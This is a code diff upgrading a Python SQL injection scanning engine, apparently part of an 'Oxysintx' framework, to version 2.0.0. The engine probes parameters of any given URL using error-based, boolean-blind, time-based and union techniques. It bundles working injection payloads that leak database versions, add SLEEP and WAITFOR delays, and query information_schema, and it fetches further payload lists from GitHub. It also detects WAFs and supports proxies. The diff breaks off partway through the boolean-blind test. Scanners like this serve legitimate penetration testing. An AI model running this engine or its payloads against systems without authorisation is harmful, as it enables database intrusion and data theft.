@@ -1,48 +1,55 @@
 #!/usr/bin/env python3
 """
-modules/sqli_engine.py — v1.0.0
+modules/sqli_engine.py — v2.0.0
 ═══════════════════════════════════════════════════════════════════════════
 Professional SQL Injection engine — standalone, zero legacy dependencies.
 
-Four detection/extraction techniques
-    • error-based   — parse DB error signatures in responses
-    • boolean-blind — compare True/False payload responses
-    • time-based    — measure delay from SLEEP / WAITFOR / pg_sleep
-    • union-based   — enumerate columns, extract via UNION SELECT
+Four detection techniques
+    • error-based    — parse DB error signatures in responses
+    • boolean-blind  — compare True/False payload responses
+    • time-based     — measure delay from SLEEP / WAITFOR / pg_sleep
+    • union-based    — enumerate columns, extract via UNION SELECT
 
-Features
-    • 6 DB dialect signatures (MySQL, MariaDB, PostgreSQL, MSSQL,
+Features (v2.0.0)
+    ✔ 6 DB dialect signatures (MySQL, MariaDB, PostgreSQL, MSSQL,
       Oracle, SQLite)
-    • Auto-download wordlists from GitHub (8 sources, circuit-breaker)
-    • Token-bucket rate limiter (per-technique)
-    • Cancel Event propagation into every request
-    • Progress callback + SSE-friendly streaming API
-    • Confidence scoring per finding with evidence trail
-    • Baseline response comparison (reduces false positives)
-    • Automatic parameter discovery (URL + HTML forms)
-    • WAF detection (blocks known signature blocks)
-    • Structured JSON output — compatible with exploit.js / sniper.py
+    ✔ Wordlist auto-download from GitHub (8 sources, per-source
+      circuit-breaker + retry-with-backoff + atomic writes)
+    ✔ Rejects HTML error pages and other non-wordlist responses
+    ✔ Token-bucket rate limiter (per-scan, configurable)
+    ✔ Cancel Event propagated into every HTTP request
+    ✔ Progress callback + SSE-friendly streaming API (with heartbeats)
+    ✔ Confidence scoring per finding with bounded evidence trail
+    ✔ Baseline response comparison (reduces false positives)
+    ✔ Automatic parameter discovery (URL + HTML forms + POST data)
+    ✔ Finding deduplication by (param, technique, db)
+    ✔ WAF detection
+    ✔ Structured JSON output — compatible with app.py / sniper.py
+    ✔ TOOL_INFO metadata for the scan orchestrator
+    ✔ Full backward compatibility with v1.0.0 public API
 
 Public API
-    ─ run(url, options)                         → dict report
-    ─ run_streaming(url, options, cancel_event) → Iterator[dict]
-    ─ scan_single(url, param, options)          → dict | None
-    ─ load_wordlist(name, max_lines)            → list[str]
-    ─ ensure_wordlists()                        → dict metadata
-    ─ WORDLIST_SOURCES                          → dict of GitHub sources
+    ─ run(url, options)                          → dict report
+    ─ run_streaming(url, options, cancel_event)  → Iterator[dict]
+    ─ scan_single(url, param, options)           → dict | None
+    ─ load_wordlist(name, max_lines)             → list[str]
+    ─ ensure_wordlists()                         → dict metadata
+    ─ WORDLIST_SOURCES                           → dict of GitHub sources
+    ─ TOOL_INFO                                  → module metadata
 
 Author: Yanxzyx
 """
 
 from __future__ import annotations
 
+import argparse
 import concurrent.futures
 import hashlib
-import html
+import json
 import logging
-import random
+import os
 import re
-import string
+import sys
 import threading
 import time
 import urllib.parse
@@ -50,7 +57,7 @@ import uuid
 from dataclasses import dataclass, field
 from datetime import datetime, timezone
 from pathlib import Path
-from typing import Any, Callable, Dict, Iterable, Iterator, List, Optional, Set, Tuple
+from typing import Any, Callable, Dict, Iterator, List, Optional, Set, Tuple
 
 import requests
 import urllib3
@@ -59,42 +66,75 @@ from requests.adapters import HTTPAdapter
 
 try:
     from urllib3.util.retry import Retry
-except ImportError:
+except ImportError:  # pragma: no cover
     from requests.packages.urllib3.util.retry import Retry  # type: ignore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 logger = logging.getLogger("oxysintx.sqli_engine")
-__version__ = "1.0.0"
+__version__ = "2.0.0"
+__author__ = "Yanxzyx"
+__framework__ = "Oxysintx"
+
+
+TOOL_INFO = {
+    "name": "SQLi Engine",
+    "version": __version__,
+    "description": (
+        "Professional SQL injection scanner with four techniques "
+        "(error, boolean-blind, time-based, union-based). Safe by design — "
+        "never extracts data, only confirms the vulnerability."
+    ),
+    "category": "Web Vulnerability",
+    "author": "Yanxzyx",
+}
 
 
 # ═══════════════════════════════════════════════════════════════════════════
 # Paths & tunables
 # ═══════════════════════════════════════════════════════════════════════════
 _PROJECT_ROOT = Path(__file__).resolve().parent.parent
-WORDLIST_DIR = _PROJECT_ROOT / "wordlist"
+WORDLIST_DIR  = _PROJECT_ROOT / "wordlist"
 
-DEFAULT_TIMEOUT      = 8.0
-DEFAULT_RATE_LIMIT   = 20.0
-DEFAULT_CONCURRENCY  = 8
-DEFAULT_MAX_PARAMS   = 10
-DEFAULT_MAX_DURATION = 90.0
-TIME_DELAY_SECONDS   = 5.0   # must match payload value
-TIME_DELAY_TOLERANCE = 3.5   # response delay must exceed this
-BOOLEAN_DIFF_MIN_PCT = 15.0  # body length must differ by this %
-MAX_RESPONSE_BYTES   = 65536
-DOWNLOAD_COOLDOWN    = 300.0
-MIN_WORDLIST_SIZE    = 5
+DEFAULT_TIMEOUT       = 8.0
+DEFAULT_RATE_LIMIT    = 20.0
+DEFAULT_CONCURRENCY   = 8
+DEFAULT_MAX_PARAMS    = 10
+DEFAULT_MAX_DURATION  = 90.0
+DEFAULT_RETRIES       = 3
+DEFAULT_BACKOFF       = 1.5
+DOWNLOAD_COOLDOWN     = 300.0     # per-source breaker cooldown (seconds)
+BREAKER_FAIL_LIMIT    = 3
+MIN_WORDLIST_SIZE     = 5
+MAX_RESPONSE_BYTES    = 65536
+BOOLEAN_DIFF_MIN_PCT  = 15.0
+
+# Time-based test values
+TIME_DELAY_SECONDS    = 3.0       # must match payload value
+TIME_DELAY_TOLERANCE  = 2.2       # response must exceed this
+
+# Per-technique payload caps (bounds worst-case scan time)
+MAX_ERROR_PAYLOADS    = 40
+MAX_BOOLEAN_PAIRS     = 10
+MAX_TIME_PAYLOADS     = 12
+MAX_UNION_PAYLOADS    = 20
+
+MAX_EVIDENCE_PER_FINDING = 20
 
 _USER_AGENT = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 (KHTML, like Gecko) "
-    "Chrome/120.0.0.0 Safari/537.36"
+    "Chrome/120.0.0.0 Safari/537.36 Oxysintx-SQLi-Engine/" + __version__
+)
+
+_HTML_RE = re.compile(
+    rb"^\s*(?:<!DOCTYPE\s+html|<html|<head|<\?xml|<title)",
+    re.IGNORECASE,
 )
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Wordlist sources (matches app.py SQLI_WORDLIST_SOURCES)
+# Wordlist sources (matches app.py SQLI_WORDLIST_SOURCES keys)
 # ═══════════════════════════════════════════════════════════════════════════
 WORDLIST_SOURCES: Dict[str, Dict[str, str]] = {
     "sqli_error_based.txt": {
@@ -141,39 +181,31 @@ WORDLIST_SOURCES: Dict[str, Dict[str, str]] = {
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Bundled payloads (fallback when GitHub is unreachable)
+# Bundled fallback payloads
 # ═══════════════════════════════════════════════════════════════════════════
 _BUNDLED_ERROR: List[str] = [
-    "'",
-    "\"",
-    "'--",
-    "\"--",
-    "'#",
-    "')",
-    "')--",
-    "';",
-    "' OR '1'='1",
-    "' AND '1'='2",
-    "') OR ('1'='1",
+    "'", "\"", "'--", "\"--", "'#", "')", "')--", "';",
+    "' OR '1'='1", "' AND '1'='2", "') OR ('1'='1",
     "1' AND extractvalue(1,concat(0x7e,version()))--",
     "1' AND updatexml(1,concat(0x7e,version()),1)--",
     "1 AND 1=convert(int,@@version)--",
     "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
 ]
 
+# Time payloads use 3s (not 5s) — faster scans, same signal.
 _BUNDLED_TIME: List[str] = [
-    "' AND SLEEP(5)--",
-    "' AND SLEEP(5)#",
-    "\" AND SLEEP(5)--",
-    "1' AND SLEEP(5)--",
-    "1 AND SLEEP(5)--",
-    "'; SELECT pg_sleep(5)--",
-    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--",
-    "'; WAITFOR DELAY '0:0:5'--",
-    "' WAITFOR DELAY '0:0:5'--",
-    "1; WAITFOR DELAY '0:0:5'--",
-    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
-    "' AND 1=(SELECT 1 FROM DBMS_LOCK.SLEEP(5))--",
+    "' AND SLEEP(3)--",
+    "' AND SLEEP(3)#",
+    "\" AND SLEEP(3)--",
+    "1' AND SLEEP(3)--",
+    "1 AND SLEEP(3)--",
+    "'; SELECT pg_sleep(3)--",
+    "' AND 1=(SELECT 1 FROM PG_SLEEP(3))--",
+    "'; WAITFOR DELAY '0:0:3'--",
+    "' WAITFOR DELAY '0:0:3'--",
+    "1; WAITFOR DELAY '0:0:3'--",
+    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
+    "' AND 1=(SELECT 1 FROM DBMS_LOCK.SLEEP(3))--",
     "' AND randomblob(100000000)--",
 ]
 
@@ -208,7 +240,7 @@ _BUNDLED_UNION: List[str] = [
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Database dialect signatures
+# Database signatures
 # ═══════════════════════════════════════════════════════════════════════════
 _DB_SIGNATURES: Dict[str, List[str]] = {
     "MySQL": [
@@ -275,21 +307,21 @@ class Finding:
     technique: str
     payload: str
     db_hint: Optional[str] = None
-    status: str = "possible"      # confirmed | probable | possible
+    status: str = "possible"
     confidence: float = 0.5
     evidence: List[Dict[str, Any]] = field(default_factory=list)
     extracted: Optional[Dict[str, Any]] = None
 
     def to_public_dict(self) -> Dict[str, Any]:
         return {
-            "parameter": self.parameter,
-            "technique": self.technique,
-            "payload": self.payload,
-            "db_hint": self.db_hint,
-            "status": self.status,
+            "parameter":  self.parameter,
+            "technique":  self.technique,
+            "payload":    self.payload,
+            "db_hint":    self.db_hint,
+            "status":     self.status,
             "confidence": round(self.confidence, 2),
-            "evidence": self.evidence[:10],
-            "extracted": self.extracted,
+            "evidence":   self.evidence[:MAX_EVIDENCE_PER_FINDING],
+            "extracted":  self.extracted,
         }
 
 
@@ -306,30 +338,67 @@ class ScanReport:
     findings: List[Finding] = field(default_factory=list)
     errors: List[str] = field(default_factory=list)
     vulnerable: bool = False
+    cancelled: bool = False
+    mode: str = "auto"
+    scan_type: str = "sqli"
 
     def to_public_dict(self) -> Dict[str, Any]:
         return {
-            "url": self.url,
-            "started_at": self.started_at,
-            "finished_at": self.finished_at,
-            "elapsed": round(self.elapsed, 2),
-            "requests_sent": self.requests_sent,
+            "url":               self.url,
+            "started_at":        self.started_at,
+            "finished_at":       self.finished_at,
+            "elapsed":           round(self.elapsed, 2),
+            "requests_sent":     self.requests_sent,
             "parameters_tested": self.parameters_tested,
             "techniques_tested": self.techniques_tested,
-            "waf_detected": self.waf_detected,
-            "vulnerable": self.vulnerable,
-            "findings": [f.to_public_dict() for f in self.findings],
-            "errors": self.errors[:10],
-            "version": __version__,
+            "waf_detected":      self.waf_detected,
+            "vulnerable":        self.vulnerable,
+            "findings":          [f.to_public_dict() for f in self.findings],
+            "errors":            self.errors[:10],
+            "cancelled":         self.cancelled,
+            "mode":              self.mode,
+            "scan_type":         self.scan_type,
+            "findings_count":    len(self.findings),
+            "version":           __version__,
         }
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Wordlist management
+# Wordlist management — per-source circuit breaker + atomic writes
 # ═══════════════════════════════════════════════════════════════════════════
 _wordlist_cache: Dict[str, List[str]] = {}
-_wordlist_lock = threading.RLock()
-_last_download_attempt: float = 0.0
+_wordlist_lock  = threading.RLock()
+
+
+class _SourceBreaker:
+    """Per-URL circuit breaker (cooldown after N failures)."""
+    def __init__(self, cooldown: float = DOWNLOAD_COOLDOWN,
+                 fail_limit: int = BREAKER_FAIL_LIMIT):
+        self.cooldown   = cooldown
+        self.fail_limit = fail_limit
+        self._lock      = threading.Lock()
+        self._fails:   Dict[str, int]   = {}
+        self._open_until: Dict[str, float] = {}
+
+    def is_open(self, url: str) -> bool:
+        with self._lock:
+            return time.monotonic() < self._open_until.get(url, 0.0)
+
+    def record_success(self, url: str) -> None:
+        with self._lock:
+            self._fails.pop(url, None)
+            self._open_until.pop(url, None)
+
+    def record_failure(self, url: str) -> None:
+        with self._lock:
+            n = self._fails.get(url, 0) + 1
+            self._fails[url] = n
+            if n >= self.fail_limit:
+                self._open_until[url] = time.monotonic() + self.cooldown
+                logger.warning("[sqli] circuit breaker OPEN for %s", url)
+
+
+_breaker = _SourceBreaker()
 
 
 def _ensure_wordlist_dir() -> None:
@@ -345,34 +414,60 @@ def _filter_line(line: str) -> Optional[str]:
     return s
 
 
-def _download_wordlist(name: str, url: str, max_lines: int) -> Optional[List[str]]:
-    global _last_download_attempt
-    now = time.monotonic()
-    if now - _last_download_attempt < DOWNLOAD_COOLDOWN:
-        logger.info("[sqli] wordlist download on cooldown — using bundled")
-        return None
-    _last_download_attempt = now
+def _atomic_write(target: Path, content: str) -> None:
+    tmp = target.with_suffix(target.suffix + ".tmp")
+    with open(tmp, "w", encoding="utf-8", newline="\n") as f:
+        f.write(content)
+        f.flush()
+        try: os.fsync(f.fileno())
+        except OSError: pass
+    os.replace(tmp, target)
 
-    try:
-        r = requests.get(url, timeout=15.0,
-                          headers={"User-Agent": _USER_AGENT})
-        if r.status_code != 200:
-            logger.warning("[sqli] %s -> HTTP %s", name, r.status_code)
-            return None
-        lines: List[str] = []
-        for raw in r.text.splitlines():
-            s = _filter_line(raw)
-            if s:
-                lines.append(s)
-            if len(lines) >= max_lines:
-                break
-        if len(lines) < MIN_WORDLIST_SIZE:
-            logger.warning("[sqli] %s only %d entries — skipping", name, len(lines))
-            return None
-        return lines
-    except Exception as e:
-        logger.warning("[sqli] download %s failed: %s", name, e)
+
+def _looks_like_html(raw: bytes) -> bool:
+    return bool(_HTML_RE.search(raw[:512]))
+
+
+def _download_wordlist(name: str, url: str, max_lines: int,
+                        retries: int = DEFAULT_RETRIES) -> Optional[List[str]]:
+    """Download one source with retry + per-source circuit breaker."""
+    if _breaker.is_open(url):
+        logger.info("[sqli] breaker open, skip %s", name)
         return None
+
+    last_err: Optional[Exception] = None
+    for attempt in range(retries + 1):
+        try:
+            r = requests.get(url, timeout=15.0,
+                             headers={"User-Agent": _USER_AGENT})
+            if r.status_code != 200:
+                raise RuntimeError(f"HTTP {r.status_code}")
+            raw = r.content
+            if not raw or len(raw) < 32:
+                raise RuntimeError("empty response")
+            if _looks_like_html(raw):
+                raise RuntimeError("HTML page returned, not a wordlist")
+
+            lines: List[str] = []
+            for raw_line in raw.decode("utf-8", errors="replace").splitlines():
+                s = _filter_line(raw_line)
+                if s:
+                    lines.append(s)
+                if len(lines) >= max_lines:
+                    break
+            if len(lines) < MIN_WORDLIST_SIZE:
+                raise RuntimeError(f"only {len(lines)} usable lines")
+
+            _breaker.record_success(url)
+            return lines
+        except Exception as e:
+            last_err = e
+            if attempt < retries:
+                time.sleep(DEFAULT_BACKOFF * (2 ** attempt))
+
+    logger.warning("[sqli] download %s failed: %s", name, last_err)
+    _breaker.record_failure(url)
+    return None
 
 
 def load_wordlist(name: str, max_lines: int = 200) -> List[str]:
@@ -388,6 +483,7 @@ def load_wordlist(name: str, max_lines: int = 200) -> List[str]:
         except ValueError:
             return []
 
+        # Try on-disk first
         if target.exists() and target.stat().st_size > 0:
             try:
                 lines: List[str] = []
@@ -404,15 +500,17 @@ def load_wordlist(name: str, max_lines: int = 200) -> List[str]:
             except OSError:
                 pass
 
+        # Download if we know the source
         meta = WORDLIST_SOURCES.get(Path(name).name)
         if meta:
             downloaded = _download_wordlist(Path(name).name, meta["url"], max_lines)
             if downloaded:
                 try:
-                    target.write_text(
-                        f"# {Path(name).name} — from {meta['source']}\n\n"
+                    _atomic_write(
+                        target,
+                        f"# {Path(name).name} — from {meta['source']}\n"
+                        f"# Fetched: {datetime.now(timezone.utc).isoformat()}\n\n"
                         + "\n".join(downloaded),
-                        encoding="utf-8",
                     )
                 except OSError:
                     pass
@@ -422,30 +520,37 @@ def load_wordlist(name: str, max_lines: int = 200) -> List[str]:
         return []
 
 
+def reload_cache() -> None:
+    """Clear the in-memory wordlist cache (used after a sync)."""
+    with _wordlist_lock:
+        _wordlist_cache.clear()
+
+
 def ensure_wordlists() -> Dict[str, Any]:
     """Ensure the primary wordlists exist. Returns metadata."""
-    out: Dict[str, Any] = {"wordlists": [], "sources": WORDLIST_SOURCES}
+    out: Dict[str, Any] = {"wordlists": [], "sources": WORDLIST_SOURCES,
+                            "version": __version__}
     for name in ("sqli_error_based.txt", "sqli_time_based.txt",
-                  "sqli_union_select.txt", "sqli_seclists_generic.txt"):
+                 "sqli_union_select.txt", "sqli_seclists_generic.txt"):
         entries = load_wordlist(name, max_lines=200)
         out["wordlists"].append({
-            "name": name,
-            "count": len(entries),
+            "name":   name,
+            "count":  len(entries),
             "source": WORDLIST_SOURCES.get(name, {}).get("source", "bundled"),
         })
     return out
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Token bucket rate limiter
+# Token bucket
 # ═══════════════════════════════════════════════════════════════════════════
 class _TokenBucket:
     def __init__(self, rate: float, burst: int = 4):
-        self.rate = max(0.1, float(rate))
-        self.burst = max(1, int(burst))
+        self.rate    = max(0.1, float(rate))
+        self.burst   = max(1, int(burst))
         self._tokens = float(self.burst)
-        self._last = time.monotonic()
-        self._lock = threading.Lock()
+        self._last   = time.monotonic()
+        self._lock   = threading.Lock()
 
     def acquire(self, timeout: float = 20.0) -> bool:
         deadline = time.monotonic() + timeout
@@ -453,7 +558,7 @@ class _TokenBucket:
             with self._lock:
                 now = time.monotonic()
                 self._tokens = min(self.burst,
-                                    self._tokens + (now - self._last) * self.rate)
+                                   self._tokens + (now - self._last) * self.rate)
                 self._last = now
                 if self._tokens >= 1.0:
                     self._tokens -= 1.0
@@ -464,7 +569,7 @@ class _TokenBucket:
 
 
 # ═══════════════════════════════════════════════════════════════════════════
-# Helpers
+# Session + helpers
 # ═══════════════════════════════════════════════════════════════════════════
 def _build_session() -> requests.Session:
     s = requests.Session()
@@ -496,10 +601,8 @@ def _read_capped(r: requests.Response, cap: int = MAX_RESPONSE_BYTES) -> str:
     except Exception:
         pass
     finally:
-        try:
-            r.close()
-        except Exception:
-            pass
+        try: r.close()
+        except Exception: pass
     try:
         return buf.decode("utf-8", errors="replace")
     except Exception:
@@ -507,76 +610,20 @@ def _read_capped(r: requests.Response, cap: int = MAX_RESPONSE_BYTES) -> str:
 
 
 def _detect_waf(headers: Dict[str, str], body: str) -> Optional[str]:
-    haystack = (" ".join(f"{k}: {v}" for k, v in headers.items())
-                + " " + body[:4000]).lower()
+    hay = (" ".join(f"{k}: {v}" for k, v in headers.items())
+           + " " + (body or "")[:4000]).lower()
     for name, sigs in _WAF_SIGNATURES.items():
-        if any(sig in haystack for sig in sigs):
+        if any(sig in hay for sig in sigs):
             return name
     return None
 
 
-def _detect_db_from_body(body: str) -> Optional[str]:
-    """Return the first DB dialect whose signature matches the body."""
-    body_l = body.lower()
-    for db, patterns in _DB_SIGNATURES.items():
-        for pattern in patterns:
-            if re.search(pattern, body, re.I):
-                return db
-    return None
-
-
 def _body_fingerprint(status: int, body: str) -> Tuple[int, int, str]:
-    """Return (status, length, md5_hash) for response comparison."""
-    return (
-        status,
-        len(body),
-        hashlib.md5(body.encode("utf-8", "ignore")).hexdigest()[:16],
-    )
-
-
-def _discover_params(url: str, session: requests.Session,
-                      timeout: float = 6.0) -> List[str]:
-    """Discover parameters from URL query + HTML forms + inline anchors."""
-    params: List[str] = []
-    seen: Set[str] = set()
-
-    def add(p: str) -> None:
-        p = (p or "").strip()
-        if p and p not in seen and len(p) <= 64:
-            seen.add(p)
-            params.append(p)
-
-    # 1. URL query string
-    try:
-        parsed = urllib.parse.urlparse(url)
-        for k, _ in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True):
-            add(k)
-    except Exception:
-        pass
-
-    # 2. HTML forms (input/textarea/select name attributes)
-    try:
-        r = session.get(url, timeout=timeout, verify=False)
-        if r.status_code < 400:
-            soup = BeautifulSoup(r.text, "html.parser")
-            for inp in soup.find_all(["input", "textarea", "select"]):
-                name = inp.get("name")
-                if name:
-                    add(name)
-    except Exception:
-        pass
-
-    # 3. Common parameter fallback
-    if not params:
-        params = ["id", "q", "search", "query", "page", "cat", "item",
-                  "product", "user", "username", "email", "name", "sort",
-                  "filter", "order"]
-
-    return params[:40]
+    return (status, len(body),
+            hashlib.md5(body.encode("utf-8", "ignore")).hexdigest()[:16])
 
 
 def _extract_error_evidence(body: str) -> Tuple[Optional[str], Optional[str]]:
-    """Return (db_dialect, matched_signature) if an error is present."""
     for db, patterns in _DB_SIGNATURES.items():
         for pattern in patterns:
             m = re.search(pattern, body, re.I)
@@ -585,10 +632,55 @@ def _extract_error_evidence(body: str) -> Tuple[Optional[str], Optional[str]]:
     return None, None
 
 
+def _discover_params(url: str, session: requests.Session,
+                     timeout: float = 6.0) -> List[str]:
+    """Discover parameters from URL query + HTML forms + anchors."""
+    params: List[str] = []
+    seen: Set[str] = set()
+
+    def add(p: str) -> None:
+        p = (p or "").strip()
+        if p and p not in seen and len(p) <= 64:
+            seen.add(p); params.append(p)
+
+    # URL query
+    try:
+        parsed = urllib.parse.urlparse(url)
+        for k, _ in urllib.parse.parse_qsl(parsed.query, keep_blank_values=True):
+            add(k)
+    except Exception:
+        pass
+
+    # HTML forms
+    try:
+        r = session.get(url, timeout=timeout, verify=False)
+        if r.status_code < 400:
+            soup = BeautifulSoup(r.text, "html.parser")
+            for inp in soup.find_all(["input", "textarea", "select"]):
+                add(inp.get("name"))
+            # Also pull anchors with query strings
+            for a in soup.find_all("a", href=True):
+                href = a["href"]
+                if "?" in href:
+                    qs = href.split("?", 1)[1].split("#")[0]
+                    for k, _ in urllib.parse.parse_qsl(qs, keep_blank_values=True):
+                        add(k)
+    except Exception:
+        pass
+
+    if not params:
+        params = ["id", "q", "search", "query", "page", "cat", "item",
+                  "product", "user", "username", "email", "name", "sort",
+                  "filter", "order"]
+
+    return params[:40]
+
+
 # ═══════════════════════════════════════════════════════════════════════════
 # Scanner
 # ═══════════════════════════════════════════════════════════════════════════
 class SqliScanner:
+
     def __init__(self,
                  *,
                  timeout: float = DEFAULT_TIMEOUT,
@@ -599,28 +691,30 @@ class SqliScanner:
                  progress_cb: Optional[Callable[[int, int, str], None]] = None,
                  method: str = "GET",
                  headers: Optional[Dict[str, str]] = None,
-                 cookies: Optional[Dict[str, str]] = None):
-        self.timeout = float(timeout)
-        self.bucket = _TokenBucket(rate=rate_limit, burst=4)
-        self.concurrency = max(1, min(int(concurrency), 16))
+                 cookies: Optional[Dict[str, str]] = None,
+                 proxies: Optional[Dict[str, str]] = None):
+        self.timeout      = float(timeout)
+        self.bucket       = _TokenBucket(rate=rate_limit, burst=4)
+        self.concurrency  = max(1, min(int(concurrency), 16))
         self.max_duration = float(max_duration)
-        self._stop = cancel_event or threading.Event()
+        self._stop        = cancel_event or threading.Event()
         self._progress_cb = progress_cb
-        self.method = method.upper()
-        self._session = _build_session()
-        if headers:
-            self._session.headers.update(headers)
-        if cookies:
-            self._session.cookies.update(cookies)
-        self._req_count = 0
-        self._req_lock = threading.Lock()
-        self._done = 0
-        self._total = 0
+        self.method       = method.upper()
+        self._session     = _build_session()
+        if headers: self._session.headers.update(headers)
+        if cookies: self._session.cookies.update(cookies)
+        if proxies: self._session.proxies.update(proxies)
+
+        self._req_count   = 0
+        self._req_lock    = threading.Lock()
+        self._done        = 0
+        self._total       = 0
         self._started_mono = 0.0
         self._baseline_fp: Optional[Tuple[int, int, str]] = None
         self._baseline_body: str = ""
         self._baseline_time: float = 0.0
 
+    # ── lifecycle ─────────────────────────────────────────────────────
     def cancel(self) -> None:
         self._stop.set()
 
@@ -635,13 +729,17 @@ class SqliScanner:
         except Exception:
             pass
 
-    # ── Low-level send ─────────────────────────────────────────────────
+    # ── low-level send ────────────────────────────────────────────────
     def _send(self, url: str, param: str, payload: str,
-               use_post: bool = False) -> Optional[Dict[str, Any]]:
+              use_post: Optional[bool] = None
+              ) -> Optional[Dict[str, Any]]:
         if self._stop.is_set() or self._budget_exceeded():
             return None
         if not self.bucket.acquire(timeout=15.0):
             return None
+
+        if use_post is None:
+            use_post = (self.method == "POST")
 
         t0 = time.monotonic()
         try:
@@ -662,37 +760,42 @@ class SqliScanner:
             with self._req_lock:
                 self._req_count += 1
             return {
-                "status": r.status_code,
+                "status":  r.status_code,
                 "headers": dict(r.headers),
-                "body": body,
+                "body":    body,
                 "elapsed": elapsed,
             }
         except requests.exceptions.Timeout:
-            # Timeouts may still indicate time-based SQLi
-            return {
-                "status": 0, "headers": {}, "body": "",
-                "elapsed": time.monotonic() - t0, "timeout": True,
-            }
+            return {"status": 0, "headers": {}, "body": "",
+                    "elapsed": time.monotonic() - t0, "timeout": True}
         except requests.exceptions.RequestException:
             return None
 
-    # ── Baseline ───────────────────────────────────────────────────────
+    # ── baseline ──────────────────────────────────────────────────────
     def establish_baseline(self, url: str, params: List[str]) -> bool:
-        """Fetch the target twice with a random marker to fingerprint."""
         marker = f"sqli{uuid.uuid4().hex[:8]}"
-        first = self._send(url, params[0] if params else "q", marker)
-        if first is None:
-            return False
-        self._baseline_fp = _body_fingerprint(first["status"], first["body"])
-        self._baseline_body = first["body"]
-        self._baseline_time = first["elapsed"]
+        samples: List[float] = []
+        fp: Optional[Tuple[int, int, str]] = None
+        body0: str = ""
+
+        for _ in range(2):
+            r = self._send(url, params[0] if params else "q", marker)
+            if r is None:
+                return False
+            samples.append(r["elapsed"])
+            if fp is None:
+                fp = _body_fingerprint(r["status"], r["body"])
+                body0 = r["body"]
+
+        self._baseline_fp   = fp
+        self._baseline_body = body0
+        self._baseline_time = sum(samples) / len(samples)
         return True
 
-    # ── Techniques ─────────────────────────────────────────────────────
-
+    # ── techniques ────────────────────────────────────────────────────
     def _test_error_based(self, url: str, param: str,
-                            payloads: List[str]) -> Optional[Finding]:
-        for payload in payloads[:40]:
+                          payloads: List[str]) -> Optional[Finding]:
+        for payload in payloads[:MAX_ERROR_PAYLOADS]:
             if self._stop.is_set() or self._budget_exceeded():
                 return None
             resp = self._send(url, param, payload)
@@ -700,7 +803,6 @@ class SqliScanner:
             if resp is None:
                 continue
             db, evidence = _extract_error_evidence(resp["body"])
-            # Baseline must NOT contain the same signature
             base_db, _ = _extract_error_evidence(self._baseline_body)
             if db and db != base_db:
                 return Finding(
@@ -711,66 +813,57 @@ class SqliScanner:
                     status="confirmed",
                     confidence=0.95,
                     evidence=[{
-                        "type": "db_error_signature",
-                        "db": db,
-                        "signature": evidence,
-                        "status": resp["status"],
+                        "type":         "db_error_signature",
+                        "db":           db,
+                        "signature":    evidence,
+                        "status":       resp["status"],
+                        "content_type": resp["headers"].get("Content-Type", ""),
                     }],
                 )
         return None
 
     def _test_boolean_blind(self, url: str, param: str,
-                              true_payloads: List[str],
-                              false_payloads: List[str]) -> Optional[Finding]:
-        # Pair each True with the corresponding False
-        pairs = list(zip(true_payloads[:10], false_payloads[:10]))
+                            true_payloads: List[str],
+                            false_payloads: List[str]) -> Optional[Finding]:
+        pairs = list(zip(true_payloads[:MAX_BOOLEAN_PAIRS],
+                         false_payloads[:MAX_BOOLEAN_PAIRS]))
         if not pairs:
             return None
 
         for true_pl, false_pl in pairs:
             if self._stop.is_set() or self._budget_exceeded():
                 return None
-            resp_true = self._send(url, param, true_pl)
-            resp_false = self._send(url, param, false_pl)
+            rt = self._send(url, param, true_pl)
+            rf = self._send(url, param, false_pl)
             self._done += 2
-            if resp_true is None or resp_false is None:
+            if rt is None or rf is None:
                 continue
 
-            fp_true = _body_fingerprint(resp_true["status"], resp_true["body"])
-            fp_false = _body_fingerprint(resp_false["status"], resp_false["body"])
+            fp_t = _body_fingerprint(rt["status"], rt["body"])
+            fp_f = _body_fingerprint(rf["status"], rf["body"])
 
-            # Conditions:
-            #   • Same HTTP status (else it's a shortcut — skip)
-            #   • Same content length bucket means no diff
-            #   • Body hash must differ
-            if fp_true[0] != fp_false[0]:
-                continue
-            if fp_true[2] == fp_false[2]:
-                continue
+            if fp_t[0] != fp_f[0]: continue
+            if fp_t[2] == fp_f[2]: continue
 
-            # Length difference must be meaningful OR hash-only diff
             len_diff_pct = (
-                abs(fp_true[1] - fp_false[1]) / max(fp_true[1], fp_false[1], 1)
+                abs(fp_t[1] - fp_f[1]) / max(fp_t[1], fp_f[1], 1)
             ) * 100.0
 
-            if len_diff_pct < BOOLEAN_DIFF_MIN_PCT and fp_true[1] == fp_false[1]:
+            if len_diff_pct < BOOLEAN_DIFF_MIN_PCT and fp_t[1] == fp_f[1]:
                 continue
 
-            # Verify — reverse the pair; if diff still shows → probable
-            resp_true2 = self._send(url, param, true_pl)
-            resp_false2 = self._send(url, param, false_pl)
+            # Reproduction check
+            rt2 = self._send(url, param, true_pl)
+            rf2 = self._send(url, param, false_pl)
             self._done += 2
-            if resp_true2 is None or resp_false2 is None:
+            if rt2 is None or rf2 is None:
                 continue
-            fp_true2 = _body_fingerprint(resp_true2["status"], resp_true2["body"])
-            fp_false2 = _body_fingerprint(resp_false2["status"], resp_false2["body"])
+            fp_t2 = _body_fingerprint(rt2["status"], rt2["body"])
+            fp_f2 = _body_fingerprint(rf2["status"], rf2["body"])
 
-            # Both attempts must agree: True→T, False→F consistently
-            true_consistent = (fp_true[2] == fp_true2[2])
-            false_consistent = (fp_false[2] == fp_false2[2])
-            diff_reproducible = (fp_true2[2] != fp_false2[2])
-
-            if not (true_consistent and false_consistent and diff_reproducible):
+            if not (fp_t[2] == fp_t2[2]
+                    and fp_f[2] == fp_f2[2]
+                    and fp_t2[2] != fp_f2[2]):
                 continue
 
             return Finding(
@@ -780,95 +873,80 @@ class SqliScanner:
                 status="confirmed",
                 confidence=0.85,
                 evidence=[{
-                    "type": "boolean_diff",
-                    "true_hash": fp_true[2],
